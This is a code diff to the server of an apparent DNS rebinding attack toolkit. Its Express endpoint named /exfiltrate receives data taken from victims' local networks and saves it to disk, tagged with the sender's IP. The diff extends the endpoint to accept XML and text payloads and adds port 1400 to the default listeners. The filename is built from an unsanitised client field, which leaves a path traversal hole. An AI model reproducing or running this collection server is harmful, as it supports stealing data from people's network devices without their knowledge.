@@ -2,7 +2,6 @@ const fs               = require('fs')
 const path             = require('path')
 const http             = require('http')
 const cors             = require('cors')
-const md5              = require('md5')
 const bodyParser       = require('body-parser')
 const express          = require('express')
 const ArgumentParser   = require('argparse').ArgumentParser
@@ -36,8 +35,12 @@ app.post('/exfiltrate', (req, res) => {
     console.log(`[*] POST ${req.url}`)
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
     const post = req.body
+    const type = post.type ? post.type.toLowerCase() : 'json'
+    let data = post.data
 
-    if (!post.data || !post.name) {
+    if (!post.data || 
+        !post.name || 
+        post.type && !['json', 'xml', 'txt'].includes(post.type.toLowerCase())) {
         console.error('[!] POST request doesn\'t contain the required fields')
         res.sendStatus(400)
         return
@@ -46,28 +49,30 @@ app.post('/exfiltrate', (req, res) => {
         res.sendStatus(400)
         return
     }
-
-    let json = null
-
-    try {
-        json = JSON.stringify(post.data)
-    } catch (err) {
-        console.error(`[!] failed to parse JSON:`)
-        console.error(post.data)
-        return
+    
+    if (type == 'json') {
+        try {
+            data = JSON.stringify(post.data)
+        } catch (err) {
+            console.error(`[!] failed to parse JSON:`)
+            console.error(post.data)
+            console.error(err)
+            res.sendStatus(400)
+            return
+        }
     }
 
-    const name = `${post.name}-${Date.now()}-${md5(json)}.json`
+    const name = `${post.name}-${Date.now()}-${ip}.${type}`
     const filename = path.join(__dirname, 'data', name)
 
-    fs.writeFile(filename, json, (err) => {
+    fs.writeFile(filename, data, (err) => {
         if (err) {
             console.error(`[!] error saving ${filename}:`)
             console.error(err)
             res.sendStatus(500) // Internal server error
         } else {
             res.sendStatus(204) // 204 No Content
-            console.log(`[+] saved JSON data to ${filename}`)
+            console.log(`[+] saved data to ${filename}`)
         }
     })
 })
@@ -101,7 +106,7 @@ function parseArgs() {
       description: 'DNS Rebind Toolkit server'
     })
 
-    const defaultPorts = [80, 8008, 8060, 1337]
+    const defaultPorts = [80, 8008, 8060, 1400, 1337]
     parser.addArgument(
       [ '-p', '--port' ],
       {
@@ -109,7 +114,7 @@ function parseArgs() {
         defaultValue: [],
         help: 'Which ports to bind the servers on. May include multiple like: '
         + '--port 80 --port 1337 '
-        + '(default: -p 80 -p 8008 -p 8060 -p 1337)'
+        + '(default: -p 80 -p 8008 -p 8060 -p 1400 -p 1337)'
       }
     )
 
